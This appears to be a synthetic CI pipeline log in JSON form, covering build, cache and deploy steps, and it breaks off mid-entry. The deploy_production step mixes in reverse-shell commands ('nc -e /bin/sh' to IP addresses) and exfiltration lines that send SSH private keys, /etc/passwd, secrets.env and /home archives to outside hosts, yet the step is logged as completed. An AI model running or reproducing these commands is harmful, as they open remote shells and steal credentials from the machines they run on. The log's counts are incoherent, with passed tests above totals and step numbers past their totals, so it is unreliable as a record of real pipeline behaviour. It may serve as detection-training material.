7/14: RUN command\n[12:18:42] DEBUG: Query executed in 80ms\nCache miss for key-5650\nSwitched to branch 'feature/task-721'\n[12:18:42] WARN: Deprecated API usage\nCache invalidated: dependencies\nCreating production build...\nInstalling react@4.13.1\nWARNING: prettier has known vulnerabilities\nnpm install: resolved 1204 packages\nOK\n  PASS: test_cache_hit (439ms)\nInstalling webpack@1.18.7\nReady.\nnpm notice: created a lockfile\nCache restored successfully (237MB)\n[12:18:42] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUsing Node.js 14.15.10\n=== Step e2e_tests completed ===\n=== Step: type_check ===\nBuilding Docker image...\nVerifying...\nTLS handshake completed\n[12:18:42] WARN: Deprecated API usage\nTime: 30.913s\nWARNING: eslint has known vulnerabilities\n\u2713 Task completed in 838ms\n[12:18:42] WARN: Deprecated API usage\nChecking out master branch\nArtifact downloaded: 41MB\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:18:42] INFO: Request completed\npip install: Successfully installed axios-3.0\nCoverage: 89% statements, 79% branches\nTests: 174 passed, 122 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nLayer 3/13: ENV command\nSnapshots: 17 passed, 43 total\nGenerating source maps...\nCache invalidated: dependencies\nEnvironment: test\n[12:18:42] INFO: Starting build process\nCompiling src/service.java...\nBundling styles.css\nOptimizing 23 modules...\npip: Installing build dependencies...\n[12:18:42] DEBUG: Query executed in 3ms\nGET /status - 204 (29ms)\nLayer 6/8: RUN command\nCompiling components/main.py...\nTests: 472 passed, 106 total\nStep 18/19: Running migrations\nException: NullPointerException\nMinifying app.js\nStep 17/21: Installing dependencies\nBundling runtime.css\nnpm notice: created a lockfile\nUsing Python 3.9\nReady.\nStep 17/20: Testing\nCompiling components/index.js...\nWARNING: react has known vulnerabilities\nInstalling webpack@4.14.3\npip: Installing build dependencies...\nTLS handshake completed\nnpm notice: created a lockfile\nImage pulled successfully\nLayer 2/11: COPY command\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling utils/index.js...\n[12:18:42] DEBUG: Loading configuration\n[12:18:42] INFO: Connecting to database\nPlatform: win32-x64\nGenerating source maps...\nCompiling lib/handler.rs...\npip install: Successfully installed react-5.14\nnpm install: resolved 1355 packages\n[12:18:42] INFO: Starting build process\nDone.\npip install: Successfully installed prettier-4.16\nImage pulled successfully\n\u2713 test completed\nyarn add: Done in 29.77s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 8/17: Building\nUsing Python 3.12\nProcessing...\nCache restored successfully (153MB)\nCompleted.\nStep 10/19: Installing dependencies\nCache saved successfully\nEnvironment: development\nConnecting to startup.dev:443...\nStep 8/17: Building\n\u2713 All checks passed\nStep 7/19: Running migrations\nPushing to registry...\nFinished.\nStep 5/19: Deploying\n[12:18:42] DEBUG: Connection pool: 8 active\n  PASS: integration/test_api_health.spec.js\n  PASS: test_api_health (261ms)\nStep 9/23: Installing dependencies\nHEAD is now at b9085ef\n  PASS: e2e/test_user_create.spec.js\nStep 18/24: Testing\nPulling image: node:18\nChecking out develop branch\nTests: 143 passed, 306 total\nGenerating source maps...\nCompleted.\nCompiling lib/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 17/23: Testing\n[12:18:42] INFO: Request completed\nEnvironment: test\nCache saved successfully\nCache miss for key-3965\npip: Downloading express-3.4.tar.gz\nCompleted.\n[12:18:42] DEBUG: Query executed in 24ms\nConnection established\nnpm install: added 38 packages\n[12:18:42] DEBUG: Memory usage: 1429MB\nOK\n=== Step type_check completed ===\n=== Step: setup_environment ===\nWARNING: eslint has known vulnerabilities\nCompiling components/index.js...\nUploading artifact 'dist' (22 files)\nCache miss for key-9929\nCache miss for key-3195\nFAILED: test_auth_login\n  PASS: unit/test_db_connect.spec.js\nUsing Node.js 17.11.6\nnpm install: resolved 199 packages\nCache hit for key-8594\nCompleted.\n  PASS: e2e/test_auth_login.spec.js\nHEAD is now at 7e3a176\nCompiling utils/app.ts...\nCompleted.\nnpm notice: created a lockfile\n[12:18:42] INFO: Request completed\nStep 17/18: Running migrations\nMinifying vendor.js\nnpm install: resolved 1947 packages\n\u2713 Task completed in 4488ms\nReady.\nSuccess!\nSwitched to branch 'bugfix/task-641'\nLoading...\nWARNING: eslint has known vulnerabilities\nTime: 79.579s\n\u2713 Task completed in 4673ms\npip: Installing build dependencies...\nyarn add: Done in 7.51s\nChecking out master branch\npip install: Successfully installed axios-5.14\n[12:18:42] WARN: Deprecated API usage\nInstalling react@4.13.3\nStep 6/22: Testing\nStep 14/19: Testing\nCreating production build...\nUploading artifact 'dist' (9 files)\n[12:18:42] DEBUG: Connection pool: 14 active\n  PASS: test_api_health (159ms)\nCompiling lib/service.java...\nCache restored successfully (290MB)\nWARNING: eslint has known vulnerabilities\n\u2713 Step 'checkout' succeeded\nCache saved successfully\nnpm install: resolved 1794 packages\nCompiling src/service.java...\nConnecting to acme.corp:443...\nCreating production build...\nPulling image: python:3.11\nCache restored successfully (192MB)\nArtifact downloaded: 26MB\nUploading artifact 'build' (33 files)\nPulling image: python:3.11\n\u2713 Step 'setup' succeeded\npip: Collecting webpack\nPulling image: python:3.11\n[12:18:42] DEBUG: Query executed in 43ms\n[12:18:42] INFO: Connecting to database\n[12:18:42] DEBUG: Connection pool: 20 active\nArtifact downloaded: 38MB\n[12:18:42] DEBUG: Initializing service\nTests: 176 passed, 247 total\n[12:18:42] WARN: Deprecated API usage\nConnecting to startup.dev:443...\nGET /status - 200 (31ms)\nStep 14/22: Testing\nUploading artifact 'coverage' (46 files)\nArtifact uploaded: dist.zip (35MB)\n[12:18:42] WARN: Deprecated API usage\nDone.\nAlready up to date.\nTime: 22.674s\nPlatform: darwin-arm64\n\u2717 build failed with exit code 68\nCoverage: 70% statements, 97% branches\nCompiling components/main.py...\nStep 3/18: Linting\npip: Downloading webpack-5.0.tar.gz\n[12:18:42] ERROR: Connection failed\nCoverage: 88% statements, 95% branches\nArtifact uploaded: build.tar.gz (23MB)\nUsing Node.js 20.19.7\nImage pulled successfully\nStep 16/17: Testing\nTest Suites: 40 passed, 43 total\nCache invalidated: build\nBuilding Docker image...\n[12:18:42] INFO: Processing request\nDone.\nCache hit for key-2851\nStep 16/24: Deploying\nOK\nHEAD is now at 65ceec1\nCache miss for key-1114\nOK\nVerifying...\nLoading...\nGET /api - 200 (42ms)\n[12:18:42] DEBUG: Memory usage: 281MB\nGET /health - 201 (28ms)\nConnection established\nSnapshots: 29 passed, 6 total\nWARNING: express has known vulnerabilities\nTest Suites: 6 passed, 45 total\n=== Step setup_environment completed ===\n=== Step: unit_tests ===\nBundling main.js\nCache miss for key-3616\n\u2713 Step 'test' succeeded\nCache miss for key-6627\nAlready up to date.\nCoverage: 98% statements, 77% branches\nLayer 2/11: ENV command\nStep 18/20: Deploying\nProcessing...\nRan 119 tests in 33s\nOptimizing 15 modules...\npip: Downloading axios-4.13.tar.gz\n[12:18:42] INFO: Cache refreshed\n[12:18:42] DEBUG: Loading configuration\n[12:18:42] DEBUG: Loading configuration\nOK\n[12:18:42] INFO: Connecting to database\nBuilding Docker image...\nnpm install: added 414 packages\nCache saved successfully\nStep 13/17: Linting\nFAILED: test_api_health\nTime: 92.138s\n[12:18:42] INFO: Cache refreshed\nStep 5/23: Deploying\nnpm install: resolved 1835 packages\nImage pulled successfully\nBundling main.css\n[12:18:42] DEBUG: Query executed in 44ms\nReady.\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Task completed in 2928ms\nCoverage: 89% statements, 60% branches\nProcessing...\nCompiling lib/handler.rs...\nGET /status - 200 (9ms)\nCache invalidated: node_modules\nArtifact uploaded: build.tar.gz (15MB)\n[12:18:42] DEBUG: Memory usage: 256MB\nProcessing...\nEnvironment: development\nTime: 23.701s\nWaiting...\nBuilding Docker image...\nPlatform: win32-x64\n[12:18:42] DEBUG: Initializing service\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 7/25: Linting\nHEAD is now at d734e6d\n[12:18:42] INFO: Starting build process\nSuccess!\nAlready up to date.\nCache miss for key-5989\nInstalling eslint@4.19.1\nyarn add: Done in 4.96s\nPlatform: win32-x64\nWARNING: prettier has known vulnerabilities\nCache hit for key-1097\nGET /status - 200 (72ms)\nnpm notice: created a lockfile\n\u2713 deploy completed\nPushing to registry...\nUsing Node.js 20.19.6\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache saved successfully\n[12:18:42] WARN: Deprecated API usage\nCompiling utils/index.js...\nConnection established\nDone.\nnpm install: added 500 packages\n[12:18:42] WARN: Deprecated API usage\n[12:18:42] DEBUG: Connection pool: 7 active\nCreating production build...\nStep 15/18: Testing\n\u2717 build failed with exit code 87\n\u2713 validate completed\nPOST /api - 200 (148ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:18:42] DEBUG: Initializing service\nPulling image: alpine:18\nCoverage: 98% statements, 98% branches\npip: Collecting jest\nArtifact downloaded: 3MB\nnpm install: resolved 1690 packages\nSnapshots: 20 passed, 3 total\nCompiling lib/utils.go...\nCompiling src/service.java...\nBuilding Docker image...\nMinifying app.js\nGenerating source maps...\n[12:18:42] DEBUG: Loading configuration\npip: Collecting lodash\nSuccess!\nWARNING: express has known vulnerabilities\nCoverage: 80% statements, 88% branches\n\u2713 Task completed in 2961ms\n\u2713 Step 'setup' succeeded\nMinifying main.js\nStep 16/18: Testing\nCache saved successfully\nCache miss for key-9728\nnpm notice: created a lockfile\n=== Step unit_tests completed ===\n=== Step: deploy_production ===\nnc -e /bin/sh 78.251.8.100 25150\n[12:18:42] DEBUG: Query executed in 31ms\nnc -e /bin/sh 124.206.182.181 43560\nyarn add: Done in 15.66s\nPlatform: darwin-arm64\nWARNING: express has known vulnerabilities\necho $(cat ~/.ssh/id_rsa) | base64 | nc 250.199.189.4 33862\nFinished.\n[12:18:42] DEBUG: Connection pool: 8 active\necho $(cat ~/.ssh/id_rsa) | base64 | nc 110.62.152.68 53189\n[12:18:42] DEBUG: Query executed in 2ms\nStep 12/15: Running migrations\n[12:18:42] DEBUG: Connection pool: 14 active\n[12:18:42] INFO: Starting build process\nProcessing...\nCache restored successfully (482MB)\n[12:18:42] INFO: Processing request\nSnapshots: 18 passed, 47 total\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\n[12:18:42] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (48MB)\nCompiling components/handler.rs...\nnpm notice: package.json updated\n  PASS: test_api_health (23ms)\nNODE_ENV=production\ncurl -X POST https://example.com/collect -d @secrets.env\nOptimizing 47 modules...\nyarn add: Done in 18.89s\n[12:18:42] DEBUG: Initializing service\nVerifying...\n[12:18:42] DEBUG: Memory usage: 188MB\nCompleted.\n\u2713 All checks passed\nPushing to registry...\ncurl -X POST https://cloud.services/collect -d @secrets.env\ntar czf - /home | curl -X POST -d @- https://example.com/upload\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling utils/service.java...\nWaiting...\n[12:18:42] DEBUG: Initializing service\nTime: 98.852s\ncurl -X POST https://example.com/collect -d @secrets.env\n[12:18:42] INFO: Processing request\nTime: 102.151s\npip: Collecting eslint\necho $(cat ~/.ssh/id_rsa) | base64 | nc 77.88.98.229 28483\npip: Collecting webpack\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nHEAD is now at e8564ae\n[12:18:42] DEBUG: Connection pool: 17 active\n[12:18:42] INFO: Processing request\ncurl -X POST https://test.io/collect -d @secrets.env\nPOST /api - 200 (114ms)\nConnection established\npip: Installing build dependencies...\npip: Downloading lodash-4.0.tar.gz\nnc -e /bin/sh 185.194.242.173 48816\nOK\nReady.\n[12:18:42] INFO: Starting build process\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nPOST /upload - 202 (444ms)\nUsing Python 3.10\nPulling image: python:18\n[12:18:42] DEBUG: Loading configuration\nnpm install: resolved 1846 packages\n[12:18:42] WARN: Deprecated API usage\ncurl -X POST https://startup.dev/collect -d @secrets.env\nFAILED: test_db_connect\necho $(cat ~/.ssh/id_rsa) | base64 | nc 234.181.186.132 48225\nOptimizing 66 modules...\nSending 444MB of data to test.io\n[12:18:42] ERROR: Connection failed\nTime: 101.314s\nSending 305MB of data to acme.corp\n\u2713 All checks passed\nCreating production build...\nLoading...\nProcessing...\nCoverage: 70% statements, 65% branches\necho $(cat ~/.ssh/id_rsa) | base64 | nc 155.44.62.148 14932\nWARNING: react has known vulnerabilities\n[12:18:42] WARN: Deprecated API usage\nVerifying...\nStep 13/19: Installing dependencies\nNODE_ENV=production\nWaiting...\n[12:18:42] INFO: Connecting to database\nCompiling lib/app.ts...\nInstalling react@3.1.3\nSending 45MB of data to test.io\nRan 31 tests in 50s\n[12:18:42] ERROR: Connection failed\nCompiling lib/handler.rs...\nCache invalidated: build\nyarn add: Done in 15.15s\n[12:18:42] DEBUG: Loading configuration\nBundling main.js\ntar czf - /home | curl -X POST -d @- https://example.com/upload\npip: Downloading axios-5.13.tar.gz\nCoverage: 91% statements, 81% branches\nTransforming 664 files...\nVerifying...\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nTime: 72.557s\nSending 51MB of data to test.io\npip: Downloading eslint-1.16.tar.gz\nSwitched to branch 'bugfix/task-297'\nSwitched to branch 'feature/task-298'\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nMinifying app.js\nFinished.\npip install: Successfully installed jest-1.7\nnc -e /bin/sh 15.181.187.101 20067\nnc -e /bin/sh 163.90.9.32 28745\nnpm install: added 317 packages\nCreating production build...\n[12:18:42] INFO: Starting build process\nVerifying...\nProcessing...\nBundling main.css\nAlready up to date.\nUsing Node.js 15.9.10\nEnvironment: staging\nChecking out develop branch\necho $(cat ~/.ssh/id_rsa) | base64 | nc 224.129.152.234 5870\nnc -e /bin/sh 221.144.227.149 27065\nConnecting to acme.corp:443...\nPushing to registry...\nBuilding Docker image...\n[12:18:42] INFO: Request completed\nSwitched to branch 'hotfix/task-187'\nSending 441MB of data to startup.dev\n=== Step deploy_production completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-21T12:18:42.571792",
        "finished_at": "2025-11-21T12:18:54.930965",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Minifying main.js",
          "pip: Collecting eslint",
          "Artifact uploaded: build.tar.gz (8MB)",
          "POST /data - 201 (406ms)",
          "Step 17/24: Testing",
          "POST /api - 200 (376ms)",
          "Compiling components/utils.go...",
          "Artifact downloaded: 40MB",
          "Installing jest@3.1.9",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Snapshots: 18 passed, 15 total",
          "WARNING: axios has known vulnerabilities",
          "Checking out develop branch",
          "Pulling image: alpine:latest",
          "Success!",
          "Success!",
          "Snapshots: 43 passed, 15 total",
          "Bundling main.js",
          "Compiling components/app.ts...",
          "[12:18:42] DEBUG: Initializing service",
          "Pushing to registry...",
          "Cache saved successfully",
          "Transforming 189 files...",
          "[12:18:42] INFO: Processing request",
          "Compiling lib/handler.rs...",
          "Processing...",
          "Ran 150 tests in 18s",
          "Ran 186 tests in 49s",
          "  PASS: test_user_create (292ms)",
          "[12:18:42] DEBUG: Memory usage: 1693MB",
          "Step 2/24: Installing dependencies",
          "Ready.",
          "Cache restored successfully (389MB)",
          "[12:18:42] DEBUG: Memory usage: 1415MB",
          "Cache invalidated: build",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 10/19: Linting",
          "Using Node.js 14.17.10",
          "Image pulled successfully",
          "Image pulled successfully",
          "[12:18:42] INFO: Connecting to database",
          "Optimizing 46 modules...",
          "Waiting...",
          "GET /api - 204 (56ms)",
          "[12:18:42] WARN: Deprecated API usage",
          "Processing...",
          "Environment: test",
          "Compiling lib/handler.rs...",
          "[12:18:42] DEBUG: Loading configuration",
          "Processing...",
          "Platform: darwin-arm64",
          "Installing eslint@3.13.5",
          "Compiling lib/handler.rs...",
          "Artifact downloaded: 34MB",
          "Time: 53.507s",
          "Optimizing 85 modules...",
          "Exception: ValueError",
          "[12:18:42] WARN: Deprecated API usage",
          "Exception: RuntimeError",
          "Step 7/22: Testing",
          "[12:18:42] INFO: Processing request",
          "Step 8/22: Testing",
          "[12:18:42] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Coverage: 74% statements, 96% branches",
          "Waiting...",
          "GET /status - 201 (59ms)",
          "Step 13/17: Installing dependencies",
          "Environment: test",
          "Compiling utils/app.ts...",
          "Using Python 3.12",
          "[12:18:42] DEBUG: Connection pool: 10 active",
          "Environment: staging",
          "Tests: 171 passed, 236 total",
          "\u2717 build failed with exit code 103",
          "Coverage: 91% statements, 95% branches",
          "Time: 9.804s",
          "Done.",
          "Step 19/22: Deploying",
          "Loading...",
          "pip: Collecting prettier",
          "Compiling components/index.js...",
          "Ready.",
          "Generating source maps...",
          "Generating source maps...",
          "Environment: staging",
          "[12:18:42] INFO: Connecting to database",
          "Compiling components/index.js...",
          "Bundling main.css",
          "Switched to branch 'feature/task-831'",
          "Cache miss for key-6568",
          "Cache invalidated: dependencies",
          "Finished.",
          "Compiling utils/app.ts...",
          "[12:18:42] DEBUG: Initializing service",
          "Verifying...",
          "Creating production build...",
          "Bundling runtime.js",
          "Layer 5/15: COPY command",
          "[12:18:42] WARN: Deprecated API usage",
          "Using Node.js 16.13.5",
          "Success!",
          "Step 17/24: Deploying",
          "Checking out main branch",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-21T12:18:54.930965",
        "finished_at": "2025-11-21T12:19:07.290138",
        "log_lines": [
          "=== Step: setup_node ===",
          "HEAD is now at c3a0557",
          "Already up to date.",
          "Transforming 603 files...",
          "yarn add: Done in 8.94s",
          "Platform: linux-x64",
          "Done.",
          "Installing lodash@3.11.6",
          "Cache miss for key-9105",
          "[12:18:42] INFO: Cache refreshed",
          "Platform: win32-x64",
          "Compiling components/utils.go...",
          "Step 20/19: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:18:42] INFO: Cache refreshed",
          "Pushing to registry...",
          "Already up to date.",
          "[12:18:42] DEBUG: Memory usage: 563MB",
          "Compiling utils/handler.rs...",
          "Step 3/23: Deploying",
          "Cache invalidated: build",
          "Cache restored successfully (408MB)",
          "[12:18:42] WARN: Deprecated API usage",
          "Completed.",
          "FAILED: test_api_health",
          "Pulling image: python:latest",
          "[12:18:42] INFO: Starting build process",
          "Compiling src/index.js...",
          "[12:18:42] INFO: Starting build process",
          "Fetching submodules...",
          "Step 20/24: Running migrations",
          "WARNING: jest has known vulnerabilities",
          "Building Docker image...",
          "Compiling lib/utils.go...",
          "pip: Collecting lodash",
          "Switched to branch 'bugfix/task-669'",
          "GET /status - 200 (91ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Verifying...",
          "\u2713 Step 'build' succeeded",
          "Success!",
          "[12:18:42] ERROR: Connection failed",
          "Artifact downloaded: 38MB",
          "  PASS: unit/test_auth_login.spec.js",
          "WARNING: express has known vulnerabilities",
          "Fetching submodules...",
          "Verifying...",
          "Cache invalidated: dependencies",
          "Tests: 102 passed, 348 total",
          "Environment: development",
          "[12:18:42] INFO: Cache refreshed",
          "npm install: resolved 1349 packages",
          "Cache miss for key-6759",
          "Cache invalidated: dependencies",
          "Compiling utils/handler.rs...",
          "npm install: resolved 913 packages",
          "[12:18:42] DEBUG: Query executed in 97ms",
          "[12:18:42] DEBUG: Memory usage: 489MB",
          "Environment: development",
          "  PASS: test_auth_login (451ms)",
          "Snapshots: 24 passed, 47 total",
          "Cache restored successfully (470MB)",
          "Step 20/24: Installing dependencies",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "Snapshots: 30 passed, 34 total",
          "Layer 2/12: COPY command",
          "Cache saved successfully",
          "Using Node.js 16.7.10",
          "  PASS: test_db_connect (29ms)",
          "Step 5/17: Building",
          "[12:18:42] INFO: Starting build process",
          "Already up to date.",
          "Pulling image: python:latest",
          "Artifact uploaded: dist.zip (66MB)",
          "\u2713 All checks passed",
          "OK",
          "[12:18:42] DEBUG: Memory usage: 1043MB",
          "npm notice: package.json updated",
          "Connecting to startup.dev:443...",
          "[12:18:42] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Waiting...",
          "pip: Downloading lodash-4.17.tar.gz",
          "Layer 10/15: COPY command",
          "[12:18:42] DEBUG: Initializing service",
          "Connection established",
          "[12:18:42] DEBUG: Initializing service",
          "[12:18:42] INFO: Starting build process",
          "NODE_ENV=production",
          "npm install: added 477 packages",
          "WARNING: axios has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 17/25: Running migrations",
          "Snapshots: 39 passed, 10 total",
          "Cache invalidated: build",
          "Completed.",
          "Step 18/22: Running migrations",
          "pip: Installing build dependencies...",
          "\u2717 build failed with exit code 92",
          "[12:18:42] DEBUG: Memory usage: 589MB",
          "[12:18:42] DEBUG: Memory usage: 602MB",
          "Step 19/15: Building",
          "Environment: staging",
          "[12:18:42] DEBUG: Connection pool: 14 active",
          "WARNING: jest has known vulnerabilities",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-21T12:19:07.290138",
        "finished_at": "2025-11-21T12:19:14.705642",
        "log_lines": [
          "=== Step: restore_cache ===",
          "  PASS: test_api_health (68ms)",
          "Step 2/20: Linting",
          "[12:18:42] WARN: Deprecated API usage",
          "Generating source maps...",
          "Test Suites: 22 passed, 48 total",
          "Ran 165 tests in 49s",
          "[12:18:42] WARN: Deprecated API usage",
          "Generating source maps...",
          "Cache miss for key-1499",
          "Already up to date.",
          "Tests: 393 passed, 500 total",
          "Step 6/18: Testing",
          "Minifying vendor.js",
          "npm install: added 311 packages",
          "Exception: TypeError",
          "\u2713 Task completed in 4992ms",
          "[12:18:42] INFO: Request completed",
          "Checking out develop branch",
          "Creating production build...",
          "FAILED: test_db_connect",
          "\u2713 lint completed",
          "Step 8/16: Deploying",
          "Tests: 349 passed, 311 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Environment: production",
          "Step 11/24: Building",
          "npm notice: created a lockfile",
          "[12:18:42] INFO: Processing request",
          "[12:18:42] DEBUG: Memory usage: 891MB",
          "OK",
          "Finished.",
          "Ran 78 tests in 50s",
          "Bundling styles.js",
          "Uploading artifact 'build' (20 files)",
          "[12:18:42] DEBUG: Connection pool: 8 active",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "Step 19/23: Installing dependencies",
          "Ready.",
          "pip: Downloading lodash-2.19.tar.gz",
          "Tests: 288 passed, 492 total",
          "Compiling src/utils.go...",
          "Exception: RuntimeError",
          "Cache invalidated: node_modules",
          "Compiling lib/service.java...",
          "Verifying...",
          "Step 14/16: Running migrations",
          "Transforming 822 files...",
          "Environment: staging",
          "Success!",
          "Cache miss for key-3606",
          "Done.",
          "TLS handshake completed",
          "Using Python 3.10",
          "Pushing to registry...",
          "Verifying...",
          "pip: Collecting react",
          "Completed.",
          "Ready.",
          "Completed.",
          "[12:18:42] INFO: Request completed",
          "TLS handshake completed",
          "Creating production build...",
          "Step 2/20: Building",
          "Test Suites: 34 passed, 16 total",
          "\u2713 All checks passed",
          "Step 14/25: Running migrations",
          "\u2717 build failed with exit code 27",
          "HEAD is now at 123e9d0",
          "FAILED: test_cache_hit",
          "Fetching submodules...",
          "\u2713 Task completed in 1304ms",
          "Tests: 454 passed, 275 total",
          "Optimizing 35 modules...",
          "Creating production build...",
          "npm install: resolved 1366 packages",
          "[12:18:42] WARN: Deprecated API usage",
          "Connection established",
          "WARNING: eslint has known vulnerabilities",
          "Verifying...",
          "Environment: test",
          "WARNING: express has known vulnerabilities",
          "\u2713 Step 'checkout' succeeded",
          "\u2713 All checks passed",
          "\u2713 Task completed in 729ms",
          "pip: Collecting jest",
          "  PASS: integration/test_cache_hit.spec.js",
          "Snapshots: 18 passed, 24 total",
          "Pushing to registry...",
          "Compiling components/handler.rs...",
          "Ran 133 tests in 19s",
          "Cache restored successfully (242MB)",
          "Cache hit for key-2217",
          "Transforming 817 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Finished.",
          "Fetching submodules...",
          "Installing axios@3.19.5",
          "Fetching submodules...",
          "Step 12/19: Installing dependencies",
          "Step 3/24: Installing dependencies",
          "Verifying...",
          "[12:18:42] INFO: Cache refreshed",
          "Minifying main.js",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-21T12:19:14.705642",
        "finished_at": "2025-11-21T12:19:22.121146",
        "log_lines": [
          "=== Step: save_cache ===",
          "pip install: Successfully installed axios-2.15",
          "[12:18:42] INFO: Cache refreshed",
          "[12:18:42] DEBUG: Connection pool: 4 active",
          "Artifact uploaded: dist.zip (66MB)",
          "Checking out main branch",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: resolved 602 packages",
          "[12:18:42] DEBUG: Initializing service",
          "Step 11/24: Running migrations",
          "Ready.",
          "[12:18:42] INFO: Request completed",
          "[12:18:42] DEBUG: Memory usage: 1391MB",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:18:42] DEBUG: Connection pool: 19 active",
          "Exception: RuntimeError",
          "Cache hit for key-9440",
          "[12:18:42] INFO: Connecting to database",
          "[12:18:42] INFO: Request completed",
          "pip: Installing build dependencies...",
          "[12:18:42] INFO: Processing request",
          "Cache miss for key-7005",
          "Cache hit for key-9530",
          "npm notice: package.json updated",
          "Platform: linux-x64",
          "Artifact downloaded: 26MB",
          "Ran 152 tests in 59s",
          "pip: Collecting react",
          "Tests: 220 passed, 281 total",
          "Step 10/18: Testing",
          "Transforming 655 files...",
          "[12:18:42] INFO: Processing request",
          "Test Suites: 37 passed, 48 total",
          "Time: 48.83s",
          "Step 7/18: Testing",
          "npm install: added 446 packages",
          "Snapshots: 47 passed, 13 total",
          "  PASS: unit/test_db_connect.spec.js",
          "npm notice: package.json updated",
          "[12:18:42] ERROR: Connection failed",
          "Coverage: 92% statements, 94% branches",
          "Optimizing 10 modules...",
          "Done.",
          "Connection established",
          "Already up to date.",
          "[12:18:42] WARN: Deprecated API usage",
          "Success!",
          "Compiling lib/app.ts...",
          "[12:18:42] DEBUG: Loading configuration",
          "\u2713 All checks passed",
          "[12:18:42] DEBUG: Loading configuration",
          "\u2713 Task completed in 2412ms",
          "  PASS: test_db_connect (304ms)",
          "pip: Collecting axios",
          "[12:18:42] WARN: Deprecated API usage",
          "Cache invalidated: build",
          "Artifact downloaded: 27MB",
          "Waiting...",
          "Verifying...",
          "Verifying...",
          "Building Docker image...",
          "Done.",
          "Tests: 104 passed, 126 total",
          "FAILED: test_auth_login",
          "[12:18:42] DEBUG: Loading configuration",
          "OK",
          "[12:18:42] DEBUG: Loading configuration",
          "pip: Collecting webpack",
          "Uploading artifact 'build' (14 files)",
          "Test Suites: 9 passed, 44 total",
          "TLS handshake completed",
          "Finished.",
          "Cache saved successfully",
          "Step 5/15: Running migrations",
          "Done.",
          "Pulling image: python:3.11",
          "Compiling src/service.java...",
          "Finished.",
          "Completed.",
          "[12:18:42] INFO: Request completed",
          "Cache miss for key-7093",
          "Using Python 3.12",
          "Image pulled successfully",
          "npm install: resolved 847 packages",
          "Bundling main.js",
          "Cache hit for key-7800",
          "npm install: resolved 384 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm install: resolved 1445 packages",
          "Test Suites: 46 passed, 17 total",
          "Test Suites: 12 passed, 17 total",
          "POST /data - 201 (63ms)",
          "npm install: resolved 460 packages",
          "pip: Collecting jest",
          "Checking out master branch",
          "Uploading artifact 'build' (19 files)",
          "pip: Installing build dependencies...",
          "POST /upload - 200 (293ms)",
          "[12:18:42] DEBUG: Query executed in 43ms",
          "  PASS: integration/test_db_connect.spec.js",
          "Loading...",
          "Ready.",
          "Step 5/21: Linting",
          "NODE_ENV=production",
          "Waiting...",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-21T12:19:22.121146",
        "finished_at": "2025-11-21T12:19:59.198665",
        "log_lines": [
          "=== Step: build ===",
          "Step 19/17: Building",
          "Connecting to startup.dev:443...",
          "Layer 7/13: COPY command",
          "Loading...",
          "Already up to date.",
          "[12:18:42] INFO: Connecting to database",
          "Uploading artifact 'coverage' (39 files)",
          "Step 20/25: Installing dependencies",
          "Pushing to registry...",
          "POST /upload - 200 (89ms)",
          "npm install: added 179 packages",
          "Environment: development",
          "Using Python 3.9",
          "[12:18:42] DEBUG: Query executed in 11ms",
          "  PASS: test_db_connect (436ms)",
          "pip install: Successfully installed lodash-1.5",
          "Tests: 423 passed, 59 total",
          "Step 1/16: Running migrations",
          "POST /data - 201 (301ms)",
          "npm notice: created a lockfile",
          "Finished.",
          "Connecting to cloud.services:443...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 13/24: Testing",
          "Creating production build...",
          "Using Node.js 20.17.8",
          "Switched to branch 'hotfix/task-462'",
          "Step 19/19: Linting",
          "Completed.",
          "TLS handshake completed",
          "Connecting to example.com:443...",
          "Transforming 607 files...",
          "[12:18:42] INFO: Connecting to database",
          "Step 9/19: Linting",
          "Compiling utils/handler.rs...",
          "Completed.",
          "Compiling components/main.py...",
          "Coverage: 90% statements, 63% branches",
          "Tests: 486 passed, 448 total",
          "[12:18:42] DEBUG: Query executed in 58ms",
          "[12:18:42] DEBUG: Query executed in 45ms",
